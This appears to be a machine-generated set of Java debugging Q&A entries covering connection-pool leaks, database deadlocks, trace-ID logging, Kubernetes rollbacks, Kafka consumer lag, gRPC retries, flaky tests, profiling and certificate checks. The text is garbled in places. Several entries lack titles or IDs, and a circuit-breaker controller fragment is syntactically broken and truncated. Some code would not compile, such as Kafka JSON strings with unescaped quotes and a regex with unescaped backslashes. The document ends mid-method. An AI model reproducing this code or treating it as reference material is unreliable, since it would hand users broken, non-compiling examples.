### 1904. Connection Pool Exhaustion
**ID:** `DBG-1904`

**Problem:** Connection Pool Exhaustion.

**Example Input:** all DB connections in use; requests queue

**Example Output:** increase pool; fix connection leaks

**Explanation:** HikariCP metrics; monitor hikaricp.connections.pending; fix leaks; tune pool size.

**Answer:**
```java
import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;

class ConnectionPoolDebugging {
    // Symptoms: HikariPool-1 - Connection is not available, request timed out after 30000ms
    // Metric: hikaricp.connections.pending -> growing queue
    // Metric: hikaricp.connections.active  -> all at max

    // Configuration:
    static HikariDataSource configurePool() {
        HikariConfig config = new HikariConfig();
        config.setJdbcUrl("jdbc:postgresql://localhost/mydb");
        config.setUsername("app");
        config.setPassword("secret");

        // Pool sizing: pool_size = Ncpu * 2 + disk_spindles (for I/O bound)
        config.setMaximumPoolSize(20);        // max connections (default 10)
        config.setMinimumIdle(5);             // min idle connections
        config.setConnectionTimeout(30000);   // 30s wait before timeout
        config.setIdleTimeout(600000);        // 10min idle before close
        config.setMaxLifetime(1800000);       // 30min max connection lifetime
        config.setLeakDetectionThreshold(60000);  // warn if connection held > 60s!

        // Enable statement caching
        config.addDataSourceProperty("cachePrepStmts", true);
        config.addDataSourceProperty("prepStmtCacheSize", 250);
        return new HikariDataSource(config);
    }

    // COMMON LEAK: connection not closed
    static void leakyCode(HikariDataSource ds) throws Exception {
        var conn = ds.getConnection();  // NEVER RETURNED TO POOL if exception thrown!
        conn.prepareStatement("SELECT 1").execute();
        // conn.close() missing!
    }

    // FIX: try-with-resources always
    static void fixedCode(HikariDataSource ds) throws Exception {
        try (var conn = ds.getConnection();
             var stmt = conn.prepareStatement("SELECT 1")) {
            stmt.execute();
        }  // auto-closed, returned to pool
    }
}

// Spring Boot config:
// spring.datasource.hikari.maximum-pool-size=20
// spring.datasource.hikari.leak-detection-threshold=60000
// management.metrics.export.prometheus.enabled=true
```

> **Time:** O(1) &nbsp; **Space:** O(pool)

### 1905. Deadlock Investigation
**ID:** `DBG-1905`

**Problem:** Deadlock Investigation.

**Example Input:** PostgreSQL deadlock detected; transactions fail

**Example Output:** lock ordering fixed; no deadlock

**Explanation:** Database deadlock differs from Java deadlock; analyze pg_locks; fix transaction order.

**Answer:**
```java
// PostgreSQL deadlock detection:
// ERROR: deadlock detected
// DETAIL: Process 123 waits for ShareLock on transaction 456; blocked by process 789.
//         Process 789 waits for ShareLock on transaction 123; blocked by process 456.
// HINT: See server log for query details.

// Query pg_locks to see current locks:
// SELECT pg_stat_activity.pid, pg_stat_activity.query, pg_locks.relation::regclass, pg_locks.mode
// FROM pg_locks JOIN pg_stat_activity USING (pid)
// WHERE NOT pg_locks.granted;

// Java/Spring: deadlock manifests as DataIntegrityViolationException or CannotSerializeTransactionException

import org.springframework.dao.DeadlockLoserDataAccessException;
import org.springframework.retry.annotation.Retryable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

@Service
class OrderService {
    // FIX 1: Retry on deadlock with exponential backoff
    @Retryable(value = DeadlockLoserDataAccessException.class, maxAttempts = 3,
               backoff = @org.springframework.retry.annotation.Backoff(delay = 100, multiplier = 2))
    @Transactional
    public void updateOrderAndInventory(Long orderId, Long productId) {
        // FIX 2: Consistent lock ordering (always lock lower ID first)
        Long firstId  = Math.min(orderId, productId);
        Long secondId = Math.max(orderId, productId);

        // SELECT ... FOR UPDATE in consistent order
        orderRepo.lockForUpdate(firstId);
        inventoryRepo.lockForUpdate(secondId);
        // now perform updates safely
    }

    // FIX 3: Use SELECT FOR UPDATE SKIP LOCKED for queue processing
    // @Query("SELECT o FROM Order o WHERE o.status='PENDING' ORDER BY id FOR UPDATE SKIP LOCKED")
    // This avoids contention; each worker gets different rows

    // FIX 4: Optimistic locking (no explicit locks)
    // @Version private Long version; -> throws OptimisticLockException on conflict, no deadlock

    private Object orderRepo; private Object inventoryRepo;
}
```

> **Time:** O(1) &nbsp; **Space:** O(1)

### 1907. Log Correlation
**ID:** `DBG-1907`

**Problem:** Log Correlation.

**Example Input:** distributed request spans multiple services; trace lost

**Example Output:** trace ID correlated across logs

**Explanation:** MDC with traceId/spanId; Sleuth/Micrometer Tracing; Zipkin/Jaeger propagation; ELK aggregation.

**Answer:**
```java
import org.slf4j.MDC;
import org.springframework.web.filter.OncePerRequestFilter;
import jakarta.servlet.http.*;
import jakarta.servlet.*;
import java.io.IOException;
import java.util.UUID;

// Log correlation with MDC (Mapped Diagnostic Context):
class TraceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                     FilterChain chain) throws ServletException, IOException {
        String traceId = req.getHeader("X-Trace-Id");
        if (traceId == null) traceId = UUID.randomUUID().toString().replace("-","").substring(0,16);

        MDC.put("traceId", traceId);
        MDC.put("userId", req.getHeader("X-User-Id"));
        res.setHeader("X-Trace-Id", traceId);  // propagate to client

        try {
            chain.doFilter(req, res);
        } finally {
            MDC.clear();  // CRITICAL: prevent ThreadLocal leak
        }
    }
}

// logback-spring.xml pattern to include traceId:
// <pattern>%d{HH:mm:ss} %-5level [%X{traceId}] %logger{36} - %msg%n</pattern>

// Spring Sleuth / Micrometer Tracing (auto propagation):
// spring.sleuth.sampler.probability=1.0  (100% sampling in dev)
// spring.zipkin.base-url=http://zipkin:9411
// Sleuth automatically adds traceId/spanId to MDC and HTTP headers

// Elasticsearch Logstash Kibana (ELK) aggregation:
// logback -> logstash-logback-encoder -> Logstash -> Elasticsearch -> Kibana
// Search: traceId:"abc123" -> see all logs for one request across services
class LogCorrelation {
    static void log(String message) {
        System.out.printf("[traceId=%s] %s%n", MDC.get("traceId"), message);
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(services)

### 1909. Rollback Release
**ID:** `DBG-1909`

**Problem:** Rollback Release.

**Example Input:** bad deployment causing errors; rollback needed

**Example Output:** previous version restored; errors stop

**Explanation:** Blue/green rollback; kubectl rollout undo; feature flag disable; database migration rollback.

**Answer:**
```java
// Rollback strategies:

// 1. Kubernetes rolling rollback (fastest for stateless services)
// kubectl rollout undo deployment/order-service          -> rollback to previous
// kubectl rollout undo deployment/order-service --to-revision=3  -> specific version
// kubectl rollout status deployment/order-service        -> verify rollback progress
// kubectl get replicasets -> see old/new replica sets

// 2. Feature flag rollback (instant, no redeploy)
// LaunchDarkly / Unleash: disable "new-payment-flow" flag -> traffic reverts
// Most production-safe rollback method

// 3. Blue/Green rollback (traffic switch)
// kubectl patch service order-service -p '{"spec":{"selector":{"version":"blue"}}}'
// Instantly switches all traffic back to stable version

// 4. Database migration rollback
// Flyway: flyway undo -> runs V3__undo.sql if present
// Liquibase: liquibase rollback --tag=v2.5.0
// Strategy: make migrations backward-compatible (additive only)

// 5. Automated rollback with Argo Rollouts
// canary.analysis.successConditions: request-success-rate > 0.95
// if condition fails: argo rollouts abort rollout/order-service

class RollbackProcedure {
    // Health gate: verify rollback success
    static boolean isServiceHealthy(String url) {
        try {
            var conn = new java.net.URL(url + "/actuator/health").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            int code = ((java.net.HttpURLConnection) conn).getResponseCode();
            return code == 200;
        } catch (Exception e) { return false; }
    }

    // Post-rollback validation
    static void validateRollback() {
        System.out.println("1. Confirm error rate dropped below threshold");
        System.out.println("2. Confirm latency back to normal");
        System.out.println("3. Smoke test critical paths");
        System.out.println("4. Notify stakeholders and write incident ticket");
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(1)

```java
// Symptoms: kubectl get pod -> STATUS=OOMKilled
// kubectl describe pod <name> -> Reason: OOMKilled; Exit Code: 137

// Investigation:
// 1. Check limits: kubectl get pod <name> -o yaml | grep -A5 resources
// 2. Check usage: kubectl top pod <name> -> memory growing over time?
// 3. Set heap dump on OOM:
//    env: JAVA_OPTS="-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dumps"
//    volumeMount: /dumps -> PersistentVolume to survive pod death

// Common causes:
// 1. Heap too large relative to container limit
//    Container limit: 512Mi; Java heap: -Xmx512m (leaves no room for off-heap!)
//    Fix: container=2Gi, -Xmx1536m (leave 512m for off-heap/metaspace)
// 2. Off-heap memory (Netty, Kafka client, native libs)
//    -XX:MaxDirectMemorySize=256m
// 3. Memory leak (static collections, ThreadLocal)

// Kubernetes resource tuning:
// resources:
//   requests: {memory: "1Gi", cpu: "500m"}
//   limits:   {memory: "2Gi", cpu: "2000m"}
// env:
//   - name: JAVA_OPTS
//     value: "-Xms512m -Xmx1536m -XX:+HeapDumpOnOutOfMemoryError"

class OOMDebug {
    public static void main(String[] args) {
        Runtime rt = Runtime.getRuntime();
        System.out.printf("Max heap: %dMB%n", rt.maxMemory()/1024/1024);
        System.out.printf("Used heap: %dMB%n", (rt.totalMemory()-rt.freeMemory())/1024/1024);
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(heap)

### 1911. Thread Pool Saturation Debug
**ID:** `DBG-1911`

**Problem:** Thread Pool Saturation Debug.

**Example Input:** executor queue growing; tasks delayed

**Example Output:** pool sized correctly; queue bounded

**Explanation:** actuator/metrics/executor.queue; thread dump; tune corePoolSize/maxPoolSize.

**Answer:**
```java
import java.util.concurrent.*;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

class ThreadPoolDebug {
    // Symptoms: tasks take much longer than expected; growing backlog
    // Metrics: executor.queued.tasks growing; executor.active == maxPoolSize

    // Check via Actuator:
    // GET /actuator/metrics/executor.queue.remaining  (remaining capacity)
    // GET /actuator/metrics/executor.active           (active threads)
    // GET /actuator/metrics/executor.pool.size        (current pool size)

    // Thread pool configuration:
    static ThreadPoolTaskExecutor configureExecutor() {
        ThreadPoolTaskExecutor exec = new ThreadPoolTaskExecutor();
        exec.setCorePoolSize(10);     // always-alive threads
        exec.setMaxPoolSize(50);      // max during spike
        exec.setQueueCapacity(100);   // bounded queue (prevents OOM)
        exec.setThreadNamePrefix("order-processor-");
        exec.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); // backpressure
        exec.setWaitForTasksToCompleteOnShutdown(true);
        exec.setAwaitTerminationSeconds(60);
        exec.initialize();
        return exec;
    }

    // Sizing formula: N_threads = N_cpu * CPU_utilization * (1 + wait_time/service_time)
    // Example: 4 CPU, 50% utilization, 90% wait (DB IO) -> 4 * 0.5 * (1 + 0.9/0.1) = 20 threads

    // Thread dump to detect stuck threads:
    // jstack <PID> | grep -A20 "order-processor"
    static void diagnose() {
        ThreadPoolExecutor tpe = (ThreadPoolExecutor)
            java.util.concurrent.Executors.newFixedThreadPool(10);
        System.out.printf("Active: %d, Queue: %d, Completed: %d%n",
            tpe.getActiveCount(), tpe.getQueue().size(), tpe.getCompletedTaskCount());
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(threads)
---

```java
import io.github.resilience4j.circuitbreaker.CircuitBreaker;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

@RestController @RequestMapping("/admin/circuit")
class CircuitBreakerAdminController {
    @Autowired CircuitBreakerRegistry registry;

    @GetMapping("/status")
    Map<String,String> getStatus() {
        return registry.getAllCircuitBreakers().stream()
            .collect(java.util.stream.Collectors.toMap(
                CircuitBreaker::getName,

    String resetCircuit(@PathVariable String name) {

    }
```

### 1913. Kafka Consumer Lag Debug
**ID:** `DBG-1913`

**Problem:** Kafka Consumer Lag Debug.

**Example Input:** consumer group lagging millions of messages

**Example Output:** lag reduced; consumers caught up

**Explanation:** kafka-consumer-groups.sh --describe; scale consumers; check processing time per message.

**Answer:**
```java
// Check consumer lag:
// kafka-consumer-groups.sh --bootstrap-server kafka:9092 --describe --group order-group
// Output: TOPIC, PARTITION, CURRENT-OFFSET, LOG-END-OFFSET, LAG, CONSUMER-ID

// Lag growing means: consumption rate < production rate
// Solutions:
// 1. Scale consumer instances (up to partition count)
// 2. Reduce per-message processing time
// 3. Increase batch size for bulk processing
// 4. Parallel processing within consumer

import org.springframework.kafka.annotation.KafkaListener;
import org.springframework.kafka.support.Acknowledgment;
import org.springframework.stereotype.Component;
import java.util.List;
import java.util.concurrent.*;

@Component
class OptimizedConsumer {
    private final ExecutorService executor = Executors.newFixedThreadPool(10);

    // SLOW: sequential processing
    @KafkaListener(topics = "orders", groupId = "order-group")
    void consumeSlow(String message) {
        processOrder(message);  // 100ms each -> 10 msg/s throughput
    }

    // FAST: batch processing
    @KafkaListener(topics = "orders", groupId = "order-group-v2",
                   containerFactory = "batchFactory")
    void consumeBatch(List<String> messages, Acknowledgment ack) {
        // Process batch in parallel
        List<Future<?>> futures = new ArrayList<>();
        for (String msg : messages) {
            futures.add(executor.submit(() -> processOrder(msg)));
        }
        futures.forEach(f -> { try { f.get(); } catch (Exception e) { /* handle */ } });
        ack.acknowledge();  // manual ack after all processed
        System.out.printf("Processed batch of %d messages%n", messages.size());
    }

    void processOrder(String msg) {
        try { Thread.sleep(10); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
// spring.kafka.listener.concurrency=8  -> 8 threads per consumer instance (must be <= partitions)
```

> **Time:** O(n) &nbsp; **Space:** O(batch)
---

```java
// Check replication lag:
// MySQL: SHOW SLAVE STATUS\G -> Seconds_Behind_Master
// PostgreSQL: SELECT now() - pg_last_xact_replay_timestamp() AS replication_lag;
// AWS RDS: CloudWatch -> ReplicaLag metric

// Causes of lag:
// 1. Heavy write load on primary (single-threaded replication in older MySQL)
// 2. Large transactions (LOAD DATA INFILE, bulk updates)
// 3. Network latency between primary and replica
// 4. Replica under-resourced (less CPU/IO)

// Application-level handling:
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;
import java.util.Optional;

@Repository
class UserRepository {
    // Route to replica for stale-tolerant reads
    @Transactional(readOnly = true)  // Spring routes to read replica if configured
    public Optional<User> findByEmail(String email) {
        return Optional.empty(); // actual query
    }

    // For consistency-critical reads, always use primary
    @Transactional  // non-readOnly -> primary
    public Optional<User> findByEmailConsistent(String email) {
        return Optional.empty();
    }
}

// Spring DataSource routing:
// @Primary DataSource -> primaryDataSource
// @ReadOnly DataSource -> replicaDataSource
// AbstractRoutingDataSource based on @Transactional(readOnly)

// Reduce lag:
// MySQL 5.7+: enable parallel replication
// SET GLOBAL slave_parallel_workers = 8;
// SET GLOBAL slave_parallel_type = LOGICAL_CLOCK;

class User {}
```

```java
import co.elastic.clients.elasticsearch.ElasticsearchClient;
import co.elastic.clients.elasticsearch.core.*;
import java.util.*;

class ElasticsearchDebug {
    // Check index health:
    // GET /_cluster/health?level=indices
    // GET /orders/_stats -> document count, size, refresh stats
    // GET /orders/_settings -> refresh_interval (default 1s)

    // Problem: documents not searchable immediately after indexing
    // Cause: ES refresh cycle (default 1s delay for segment creation)

    // FIX 1: Immediate refresh after indexing (use sparingly, expensive)
    static void indexWithRefresh(ElasticsearchClient client, String doc) throws Exception {
        client.index(IndexRequest.of(r -> r
            .index("orders")
            .id(UUID.randomUUID().toString())
            .document(Map.of("data", doc))
            .refresh(co.elastic.clients.elasticsearch._types.Refresh.True)));  // immediate refresh
    }

    // FIX 2: Increase refresh interval for bulk indexing (performance mode)
    // PUT /orders/_settings  {"index": {"refresh_interval": "30s"}}
    // Then after bulk: POST /orders/_refresh  (manual refresh)

    // FIX 3: Check mapping issues (data type mismatch drops documents)
    // GET /orders/_mapping
    // PUT /orders/_mapping {"properties":{"amount":{"type":"double"}}}

    // Shard routing: documents spread across shards
    // GET /orders/_search?explain=true -> see which shard served query
    // If one shard missing: GET /_cat/shards/orders?v -> check UNASSIGNED shards

    // Reindex corrupted index:
    // POST /_reindex {"source":{"index":"orders"},"dest":{"index":"orders_v2"}}
    // PUT /orders_alias -> point alias to new index with zero downtime
}
```

### 1916. Memory-Mapped File Debug
**ID:** `DBG-1916`

**Problem:** Memory-Mapped File Debug.

**Example Input:** FileNotFoundException after disk resize

**Example Output:** memory-mapped files invalid after resize

**Explanation:** Remap MappedByteBuffer; close and reopen FileChannel after size change.

**Answer:**
```java
import java.io.*;
import java.nio.*;
import java.nio.channels.*;

class MemoryMappedFileDebug {
    // Memory-mapped file becomes invalid if underlying file is modified externally
    // Exception: java.io.IOException: The mapped file has been modified

    static void safeReadMappedFile(String path) throws IOException {
        // Always wrap in try-with-resources for proper channel closing
        try (RandomAccessFile raf = new RandomAccessFile(path, "r");
             FileChannel channel = raf.getChannel()) {
            long fileSize = channel.size();
            if (fileSize == 0) {
                System.out.println("Empty file, skip mapping");
                return;
            }
            // Map in chunks if large (> 2GB limit of MappedByteBuffer)
            long chunkSize = Math.min(fileSize, 1024 * 1024 * 512L);  // 512MB chunks
            MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_ONLY, 0, chunkSize);

            // Process buffer...
            byte[] data = new byte[(int)chunkSize];
            buffer.get(data);
            System.out.printf("Read %d bytes from memory-mapped file%n", data.length);
        }
    }

    // Issue: MappedByteBuffer is not garbage collected immediately
    // Force unmap (reflection hack, Java 8; use cleaner in Java 9+):
    static void forceUnmap(MappedByteBuffer buffer) {
        try {
            var cleaner = buffer.getClass().getMethod("cleaner");
            cleaner.setAccessible(true);
            var clean = cleaner.invoke(buffer);
            if (clean != null) {
                clean.getClass().getMethod("clean").invoke(clean);
            }
        } catch (Exception e) {
            System.err.println("Could not force unmap: " + e.getMessage());
        }
    }

    public static void main(String[] args) throws IOException {
        safeReadMappedFile("data.bin");
    }
}
```

> **Time:** O(fileSize) &nbsp; **Space:** O(1)

### 1917. gRPC Service Debug
**ID:** `DBG-1917`

**Problem:** gRPC Service Debug.

**Example Input:** gRPC call fails with UNAVAILABLE; intermittently

**Example Output:** client reconnects; retry configured

**Explanation:** Enable gRPC health check; retry policy; deadline propagation; channel keep-alive.

**Answer:**
```java
import io.grpc.*;
import io.grpc.stub.*;
import java.util.concurrent.TimeUnit;

class GrpcClientDebug {
    // Error: UNAVAILABLE: io exception / Connection refused
    // Causes: server restart, network blip, idle connection timeout

    static ManagedChannel buildResilientChannel(String host, int port) {
        return ManagedChannelBuilder.forAddress(host, port)
            .usePlaintext()
            // Keep-alive: prevent idle connection closure by load balancers
            .keepAliveTime(30, TimeUnit.SECONDS)
            .keepAliveTimeout(10, TimeUnit.SECONDS)
            .keepAliveWithoutCalls(true)  // keep-alive even with no active calls

            // Retry policy for transient failures
            .defaultServiceConfig(buildRetryConfig())

            // Deadline for all calls (override per-call if needed)
            .intercept(new DeadlineInterceptor(5, TimeUnit.SECONDS))
            .build();
    }

    static java.util.Map<String,?> buildRetryConfig() {
        return java.util.Map.of("methodConfig", java.util.List.of(java.util.Map.of(
            "name", java.util.List.of(java.util.Map.of("service", "")),
            "retryPolicy", java.util.Map.of(
                "maxAttempts", 4.0,
                "initialBackoff", "0.5s",
                "maxBackoff", "10s",
                "backoffMultiplier", 2.0,
                "retryableStatusCodes", java.util.List.of("UNAVAILABLE","DEADLINE_EXCEEDED")))));
    }

    // Per-call deadline
    static void callWithDeadline(HelloGrpc.HelloBlockingStub stub) {
        try {
            stub.withDeadlineAfter(3, TimeUnit.SECONDS)
                .withWaitForReady()  // wait if server temporarily down
                .sayHello(HelloRequest.newBuilder().setName("World").build());
        } catch (StatusRuntimeException e) {
            if (e.getStatus().getCode() == Status.Code.DEADLINE_EXCEEDED) {
                System.err.println("gRPC call timed out");
            }
        }
    }
}
// Mock stubs for compilation
class HelloGrpc { static class HelloBlockingStub { HelloGrpc.HelloBlockingStub withDeadlineAfter(long t,TimeUnit u){return this;} HelloGrpc.HelloBlockingStub withWaitForReady(){return this;} void sayHello(HelloRequest r){} } }
class HelloRequest { static HelloRequest.Builder newBuilder(){return new Builder();} static class Builder{HelloRequest build(){return new HelloRequest();} Builder setName(String n){return this;}} }
class DeadlineInterceptor implements ClientInterceptor { long ms; TimeUnit u; DeadlineInterceptor(long m,TimeUnit u){ms=m;this.u=u;} public <Req,Resp> ClientCall<Req,Resp> interceptCall(MethodDescriptor<Req,Resp> m, CallOptions o, Channel c){return c.newCall(m,o);} }
```

> **Time:** O(1) &nbsp; **Space:** O(retries)

### 1919. Flaky Test Debug
**ID:** `DBG-1919`

**Problem:** Flaky Test Debug.

**Example Input:** test passes locally; fails in CI intermittently

**Example Output:** test made deterministic; no more flakiness

**Explanation:** Identify time-dependency, race condition, or order-dependency; use fixed clock or await.

**Answer:**
```java
import org.awaitility.Awaitility;
import org.junit.jupiter.api.*;
import java.time.*;
import java.util.concurrent.TimeUnit;
import static org.junit.jupiter.api.Assertions.*;

class FlakyTestFixes {
    // FLAKY CAUSE 1: Time-dependent test
    // BAD: test assumes current date
    // static void badTest() { assertEquals(LocalDate.of(2024,1,1), service.getDate()); }

    // FIX 1: Inject clock
    static class ReportService {
        private final Clock clock;
        ReportService(Clock c) { clock=c; }
        String generateReport() { return "Report for " + LocalDate.now(clock); }
    }

    @Test void testWithFixedClock() {
        Clock fixed = Clock.fixed(Instant.parse("2024-01-15T10:00:00Z"), ZoneOffset.UTC);
        ReportService service = new ReportService(fixed);
        assertEquals("Report for 2024-01-15", service.generateReport());
    }

    // FLAKY CAUSE 2: Async test with Thread.sleep (unreliable)
    // BAD: Thread.sleep(500); assertTrue(result.isDone());

    // FIX 2: Awaitility for async assertions
    @Test void testAsyncWithAwaitility() {
        var list = new java.util.concurrent.CopyOnWriteArrayList<String>();
        new Thread(() -> { try { Thread.sleep(100); } catch (InterruptedException e) {} list.add("done"); }).start();

        Awaitility.await()
            .atMost(5, TimeUnit.SECONDS)
            .pollInterval(50, TimeUnit.MILLISECONDS)
            .until(() -> !list.isEmpty());
        assertEquals("done", list.get(0));
    }

    // FLAKY CAUSE 3: Test order dependency
    // FIX 3: Each test cleans up after itself; use @BeforeEach/@AfterEach
    // @TestMethodOrder(MethodOrderer.OrderAnnotation.class) if ordering truly needed

    // FLAKY CAUSE 4: Random data causing edge cases
    // FIX 4: Use deterministic test data, not random
    // BAD: String id = UUID.randomUUID().toString();  (might clash with existing data)
    // GOOD: String id = "test-id-" + testName;  (deterministic)
}
```

**ID:** `DBG-1920`

**Example Output:** hot spot identified; optimized

**Explanation:** Async-profiler flamegraph; JFR recording; identify hot method; optimize allocation.

**Answer:**
```java
// Async Profiler (recommended - low overhead, works with JIT):
// ./profiler.sh start -e cpu -f /tmp/cpu.jfr <PID>
// ./profiler.sh stop <PID>
// ./profiler.sh -d 60 -f /tmp/flamegraph.html <PID>  -> flamegraph
// ./profiler.sh -d 60 -e alloc -f /tmp/alloc.html <PID>  -> allocation hotspot

// Java Flight Recorder (built into JVM, low overhead):
// jcmd <PID> JFR.start name=profiling duration=60s filename=/tmp/rec.jfr settings=profile
// jcmd <PID> JFR.stop name=profiling
// Open in JDK Mission Control (jmc): analyze CPU, allocation, locks, I/O

// Common hot spots in Java:
import java.util.*;
import java.util.stream.*;

class HotSpotExamples {
    // HOT: String concatenation in loop (creates O(n^2) intermediate strings)
    static String BAD_concat(List<String> items) {
        String result = "";
        for (String s : items) result += s + ",";  // O(n^2) allocations!
        return result;
    }
    // GOOD: StringBuilder
    static String GOOD_concat(List<String> items) {
        StringBuilder sb = new StringBuilder(items.size() * 20);
        items.forEach(s -> sb.append(s).append(','));
        return sb.toString();  // O(n) allocations
    }

    // HOT: Boxing/unboxing in hot path
    static long BAD_sum(List<Integer> list) {
        return list.stream().reduce(0, Integer::sum);  // boxes each int
    }
    static long GOOD_sum(List<Integer> list) {
        return list.stream().mapToInt(Integer::intValue).sum();  // primitive IntStream
    }

    // HOT: Regex compilation every call
    static java.util.regex.Pattern EMAIL_PATTERN = java.util.regex.Pattern.compile("^[\w.-]+@[\w.-]+\.\w+$");
    static boolean isEmail(String s) { return EMAIL_PATTERN.matcher(s).matches(); }  // reuse compiled pattern
}
```

> **Time:** O(n) &nbsp; **Space:** O(n)

**Explanation:** Spring Boot startup actuator; lazy initialization; reduce component scan scope.

```java
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.ComponentScan;

// Startup optimization techniques:

// 1. Enable startup actuator report
// management.endpoints.web.exposure.include=startup
// GET /actuator/startup -> shows each bean initialization time

// 2. Lazy bean initialization
// spring.main.lazy-initialization=true  -> beans created on first use, not startup
// But: first request is slower; some issues only surface at runtime

// 3. Restrict component scan (don't scan everything)
@SpringBootApplication
@ComponentScan(basePackages = {"com.myapp.core","com.myapp.api"})  // explicit, not whole classpath
class OptimizedApp {
    public static void main(String[] args) {
        var app = new SpringApplication(OptimizedApp.class);
        app.setLazyInitialization(false);  // false for production (eager = safer)
        app.run(args);
    }
}

// 4. Exclude unused auto-configurations
// @SpringBootApplication(exclude = {DataSourceAutoConfiguration.class, ...})

// 5. Spring AOT (Ahead-of-Time compilation, Spring Boot 3+)
// mvn spring-boot:process-aot  -> generates AOT hints, faster startup
// Native image: GraalVM native-image -> instant startup (milliseconds)

// 6. Profile startup with -Dspring.jpa.open-in-view=false (avoids proxy creation overhead)
// 7. Use H2 in-memory for dev, don't flyway on startup in tests
// spring.flyway.enabled=false (in test profile)
```

> **Time:** O(beans) &nbsp; **Space:** O(1)

**Example Output:** certificate renewed; HTTPS working

**Explanation:** keytool to inspect cert; renew via Let's Encrypt; update keystore; restart service.

**Answer:**
```java
import javax.net.ssl.*;
import java.security.cert.*;
import java.net.URL;

class SSLCertDebug {
    // Check cert expiry programmatically:
    static void checkCertExpiry(String hostname) throws Exception {
        SSLContext ctx = SSLContext.getInstance("TLS");
        ctx.init(null, null, null);  // default trust manager
        SSLSocketFactory factory = ctx.getSocketFactory();

        try (SSLSocket socket = (SSLSocket) factory.createSocket(hostname, 443)) {
            socket.startHandshake();
            Certificate[] certs = socket.getSession().getPeerCertificates();
            for (Certificate cert : certs) {
                if (cert instanceof X509Certificate x509) {
                    System.out.printf("Subject: %s%n", x509.getSubjectX500Principal());
                    System.out.printf("Expires: %s%n", x509.getNotAfter());
                    long daysLeft = (x509.getNotAfter().getTime() - System.currentTimeMillis()) / 86400000;
                    System.out.printf("Days left: %d%n", daysLeft);
                    if (daysLeft < 30) System.out.println("WARNING: Certificate expiring soon!");
                }
            }
        }
    }

    // keytool commands:
    // keytool -list -keystore keystore.jks -storepass changeit -> list certs
    // keytool -printcert -sslserver myapp.com:443 -> inspect remote cert
    // openssl s_client -connect myapp.com:443 | openssl x509 -noout -dates

    // Renewal via Let's Encrypt (Certbot):
    // certbot renew --cert-name myapp.com
    // Or use cert-manager in Kubernetes (auto-renews)

    // Spring Boot keystore config:
    // server.ssl.key-store=classpath:keystore.p12
    // server.ssl.key-store-password=mypassword
    // server.ssl.key-store-type=PKCS12

    public static void main(String[] args) throws Exception {
        checkCertExpiry("example.com");
    }
}
```

### 1924. Database Index Bloat Debug
**ID:** `DBG-1924`

**Problem:** Database Index Bloat Debug.

**Example Input:** DB table 50GB; queries slow; index not used

**Example Output:** index rebuilt; queries fast

**Explanation:** VACUUM ANALYZE (Postgres); rebuild index; check index usage stats; drop unused indexes.

**Answer:**
```java
// PostgreSQL index bloat diagnosis:
// SELECT schemaname, tablename, pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as total_size,
//        pg_size_pretty(pg_relation_size(schemaname||'.'||tablename)) as table_size,
//        pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename) - pg_relation_size(schemaname||'.'||tablename)) as index_size
// FROM pg_tables WHERE schemaname = 'public' ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;

// Check index usage:
// SELECT indexname, idx_scan, idx_tup_read, idx_tup_fetch FROM pg_stat_user_indexes WHERE tablename='orders';
// idx_scan=0 -> unused index (wastes space and slows writes, drop it)

// Bloat from deleted rows (not reclaimed):
// SELECT pg_size_pretty(pg_total_relation_size('orders')), n_dead_tup FROM pg_stat_user_tables WHERE relname='orders';
// n_dead_tup >> 0 -> needs VACUUM

// Fix:
// VACUUM ANALYZE orders;        -> reclaim space, update stats
// VACUUM FULL orders;           -> full rebuild, compact table (locks table!)
// REINDEX INDEX idx_orders_status;  -> rebuild index (concurrent version: REINDEX CONCURRENTLY)
// REINDEX TABLE CONCURRENTLY orders;  -> rebuild all indexes without locking

// Auto-vacuum tuning:
// ALTER TABLE orders SET (autovacuum_vacuum_scale_factor = 0.01,  -- vacuum after 1% dead rows
//                         autovacuum_analyze_scale_factor = 0.005);

class IndexBloatDebug {
    public static void main(String[] args) {
        System.out.println("EXPLAIN (ANALYZE, BUFFERS) SELECT ...; -> shows index usage");
        System.out.println("Look for 'Index Scan' vs 'Seq Scan' in query plan");
        System.out.println("Set enable_seqscan=off temporarily to force index (test only)");
    }
}
```

> **Time:** O(n) &nbsp; **Space:** O(index)
---

### 1925. Message Ordering Debug
**ID:** `DBG-1925`

**Problem:** Message Ordering Debug.

**Example Input:** Kafka messages processed out of order

**Example Output:** ordering guaranteed per key

**Explanation:** Kafka ordering per partition; ensure same key -> same partition; single consumer per partition.

**Answer:**
```java
import org.apache.kafka.clients.producer.*;
import java.util.Properties;

class KafkaOrderingDebug {
    // Kafka ordering guarantee: WITHIN a partition, messages are ordered
    // Across partitions: no ordering guarantee

    // FIX: Use the entity ID as message key -> same key always goes to same partition
    static void sendOrderedMessages(KafkaProducer<String,String> producer) {
        // orderId as key -> all events for same order go to same partition
        producer.send(new ProducerRecord<>("order-events", "order-123", "{"status":"CREATED"}"));
        producer.send(new ProducerRecord<>("order-events", "order-123", "{"status":"PAID"}"));
        producer.send(new ProducerRecord<>("order-events", "order-123", "{"status":"SHIPPED"}"));
        // These 3 messages are guaranteed to be in order within the partition
    }

    // Ensure in-order delivery on producer side:
    static Properties orderedProducerProps() {
        Properties props = new Properties();
        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        props.put(ProducerConfig.ACKS_CONFIG, "all");
